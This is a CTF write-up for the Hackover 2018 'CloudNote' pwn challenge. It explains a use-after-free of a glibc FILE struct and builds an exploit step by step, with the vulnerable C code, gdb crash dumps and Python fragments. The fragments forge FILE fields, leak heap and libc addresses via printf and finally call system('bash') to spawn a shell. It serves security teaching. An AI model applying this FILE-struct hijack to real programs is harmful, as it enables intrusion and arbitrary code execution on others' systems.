---
title: "CTF Hackover 2018 - Pwn - CloudNote"
description: "A FILE struct use after free""
---

# Description

This challenge was created for the Hackover 2018 CTF.

```
This lightweight service hosts your notes in the Cloud.
Feel free to test our service with the guest:guest test account.
For optimal security use a recent Ubuntu Xenial or the provided libc.
```

# Vulnerability

The application has a use after free vulnerability, allowing to overwrite users `FILE` struct.
The note database is opened using `fopen();` and closed after logout, but the `user` pointer is not set to `NULL`.
As the `FILE` struct is alloceted on the heap and freed by `fclose()` the next allocated heap chunk might overwrite this structure.
If the user tries to add a long note after logout, the application segfaults.

```c
void logout() {
    if (user != NULL)
        fclose(user);
    printf("Succsess\n");

    return;
}

void note_add() {
    char *buff = NULL;
    char c;

    if (!user) {
        printf("ERROR: not logged in\n");
        return;
    }

    printf("note> ");
    fflush(stdout);
    getline(&buff, &len, stdin);
    fseek(user, 0, SEEK_END);
    fwrite(buff, strlen(buff), 1, user);
    free(buff);
}

```

`getline()` writes user input to the heap, overwriting the `FILE` struct that is passed to `fseek()` and `fwrite()`.
The `FILE` struct contains a pointer to a jumptable, that holds handlers for various operations(read, write, seek, etc.), the corresponding `_IO_FILE` struct is defined in `libio.h`

# RIP Control

First we have to trigger the UAF:
```
  ____ _                 _ _   _       _       
 / ___| | ___  _   _  __| | \ | | ___ | |_ ___ 
| |   | |/ _ \| | | |/ _` |  \| |/ _ \| __/ _ \
| |___| | (_) | |_| | (_| | |\  | (_) | ||  __/
 \____|_|\___/ \__,_|\__,_|_| \_|\___/ \__\___|
                                               
-----------------------------------------------
Because it's a great Idea!
cmd> login
Username: guest
Password: guest
Succsess
cmd> logout
Succsess
cmd> note add
note> AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)A..........
[...]
Stopped reason: SIGSEGV
0x00007ffff7a82f20 in __GI_fseek (fp=0x6039d0, offset=0x0, whence=0x2) at fseek.c:35
[...]
gdb-peda$ pattern search
[...]
Registers point to pattern buffer:
[RDI] --> offset 288 - size ~203
```

The Programm will crashes and a quick look at the registers shows, that `$rdi` points at offset 288 of our buffer, which is the start of our `FILE` struct.
Let's prepare our exploit, starting with a peda pattern:

```python
def set_data(fstruct, offset, val):
    return fstruct[:offset] + val + fstruct[offset+len(val):]

fstruct = pattern
exploit = "A" * 288 + fstruct
```
Will result in the following crash:
```
   0x7f80dd35489e <fseek+14>:   jne    0x7f80dd3548f9 <fseek+105>
   0x7f80dd3548a0 <fseek+16>:   mov    r8,QWORD PTR [rdi+0x88]
   0x7f80dd3548a7 <fseek+23>:   mov    r10,QWORD PTR fs:0x10
=> 0x7f80dd3548b0 <fseek+32>:   cmp    r10,QWORD PTR [r8+0x8]
   0x7f80dd3548b4 <fseek+36>:   je     0x7f80dd3548f4 <fseek+100>
   0x7f80dd3548b6 <fseek+38>:   mov    esi,0x1
   0x7f80dd3548bb <fseek+43>:   cmp    DWORD PTR [rip+0x332e1e],0x0        # 0x7f80dd6876e0 <__libc_multiple_threads>
   0x7f80dd3548c2 <fseek+50>:   je     0x7f80dd3548cd <fseek+61>

gdb-peda$ pattern search
Registers contain pattern buffer:
r8+0 found at offset 136
```
This is a pointer to `_IO_FILE._lock` and should point to a writable location containing 0x00.
We choose a random address in the BSS segment.
```python
def set_data(fstruct, offset, val):
    return fstruct[:offset] + val + fstruct[offset+len(val):]

fstruct = pattern
fstruct = set_data(fstruct, 136, pwn.p64(nullptr))
exploit = "A" * 288 + fstruct
```
```
   0x7f252345533e <_IO_seekoff_unlocked+30>:    js     0x7f25234553b0 <_IO_seekoff_unlocked+144>
   0x7f2523455340 <_IO_seekoff_unlocked+32>:    je     0x7f2523455379 <_IO_seekoff_unlocked+89>
   0x7f2523455342 <_IO_seekoff_unlocked+34>:    mov    rax,QWORD PTR [rdi+0xa0]
=> 0x7f2523455349 <_IO_seekoff_unlocked+41>:    cmp    QWORD PTR [rax+0x40],0x0
   0x7f252345534e <_IO_seekoff_unlocked+46>:    je     0x7f2523455379 <_IO_seekoff_unlocked+89>
   0x7f2523455350 <_IO_seekoff_unlocked+48>:    cmp    edx,0x1
   0x7f2523455353 <_IO_seekoff_unlocked+51>:    je     0x7f2523455436 <_IO_seekoff_unlocked+278>
   0x7f2523455359 <_IO_seekoff_unlocked+57>:    mov    rdi,rbx
gdb-peda$ pattern search
Registers contain pattern buffer:
RAX+0 found at offset: 160  
[...]
```
Lets set this pointer to the same location and see what happens:
```python
def set_data(fstruct, offset, val):
    return fstruct[:offset] + val + fstruct[offset+len(val):]

fstruct = pattern
fstruct = set_data(fstruct, 136, pwn.p64(nullptr))
fstruct = set_data(fstruct, 160, pwn.p64(nullptr))
exploit = "A" * 288 + fstruct
```
```
   0x466904 <_IO_seekoff_unlocked+84>:  mov    rsi,QWORD PTR [rsp]
   0x466908 <_IO_seekoff_unlocked+88>:  mov    rax,QWORD PTR [rbx+0xd8]
   0x46690f <_IO_seekoff_unlocked+95>:  mov    rdi,rbx
=> 0x466912 <_IO_seekoff_unlocked+98>:  mov    rax,QWORD PTR [rax+0x48]
   0x466916 <_IO_seekoff_unlocked+102>: add    rsp,0x10
   0x46691a <_IO_seekoff_unlocked+106>: pop    rbx
   0x46691b <_IO_seekoff_unlocked+107>: jmp    rax
   0x46691d <_IO_seekoff_unlocked+109>: nop    DWORD PTR [rax]
gdb-peda$ pattern search
Registers contain pattern buffer:
RAX+0 found at offset: 216
[...]
Registers point to pattern buffer:
[RDI] --> offset 0 - size ~142
```
The code will now jump to `rax+0x48` which is copied from offset 216 in our buffer!
In addition `rdi` also points to our forged `FILE` struct, so we can also controll the first argument.
Lets write a pointer to `printf@got-0x48` at offset 216:

```python
def set_data(fstruct, offset, val):
    return fstruct[:offset] + val + fstruct[offset+len(val):]

fstruct = pattern
fstruct = set_data(fstruct, 136, pwn.p64(nullptr))
fstruct = set_data(fstruct, 160, pwn.p64(nullptr))
fstruct = set_data(fstruct, 216, pwn.p64(got_printf-0x48))
exploit = "A" * 288 + fstruct
```

```
note> AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)A..........
AAA0X0.0000000E6C4BP-1...............
cmd>
```

Nice! The code prints our `FILE` struct directly on the screen.

# Exploit
We can now replace our peda pattern with lots of `%p|` to leak the heap and libc base.

```python
def set_data(fstruct, offset, val):
    return fstruct[:offset] + val + fstruct[offset+len(val):]

fstruct = "%p|" * 64
fstruct = set_data(fstruct, 136, pwn.p64(nullptr))
fstruct = set_data(fstruct, 160, pwn.p64(nullptr))
fstruct = set_data(fstruct, 216, pwn.p64(got_printf-0x48))
exploit = "A" * 288 + fstruct
```

```
note> %p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|.............
(nil)|0x2|0x3|0x6020f0|(nil)|0x2454420|0x401037|0x24554b0|0x6dde37d37eab4000|0x7ffc1f28a680|...
|0x1c|0x1|0x7ffc1f28afce|%`cmd>
```

As we broke ASLR, we are now ready to execute `system()` in the second stage.
This time, we have to replace the call to `printf()` with a call to `system()`.
As the adress of `system();` is not in memory, we have to write it to an unsed location in the `FILE` struct.
We can use the beginning of our `FILE` struct to pass any argument.

```python
def set_data(fstruct, offset, val):
    return fstruct[:offset] + val + fstruct[offset+len(val):]

fstruct = "%p|" * 64
fstruct = set_data(fstruct, 0, "bash\x00")
fstruct = set_data(fstruct, 32, pwn.p64(libc + system_offset))
fstruct = set_data(fstruct, 136, pwn.p64(nullptr))
fstruct = set_data(fstruct, 160, pwn.p64(nullptr))
fstruct = set_data(fstruct, 216, pwn.p64(heap + 5616 - 0x48))
exploit = "A" * 288 + fstruct
```
And we got a shell ;)

```
cat flag
hackover2018{4lw4y2_Null_y0uR_P01Nt3R}
```


# Files
- [exploit.py](exploit.py)
- [cloudnote.c](cloudnote.c)
- [cloudnote](cloudnote)
- [libc.so.6](libc.so.6)
- [ld-2.23.so](ld-2.23.so)
- [Dockerfile](Dockerfile)
- [Makefile](Makefile)
